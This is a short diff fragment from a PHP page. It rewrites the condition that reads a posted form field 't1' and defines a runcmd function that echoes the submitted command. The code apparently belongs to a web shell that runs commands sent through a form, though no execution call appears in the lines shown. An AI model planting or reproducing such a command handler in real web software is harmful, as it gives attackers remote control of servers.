@@ -15,8 +15,7 @@
       </div>
     </div>
 <?php
-if (isset($_POST)) {
-if ($_POST['t1']!="") {
+if (isset($_POST["t1"]) && !empty($_POST["t1"])) {
 function runcmd ($cmd){
   echo "<pre><strong>";
   echo ">  ". $cmd;
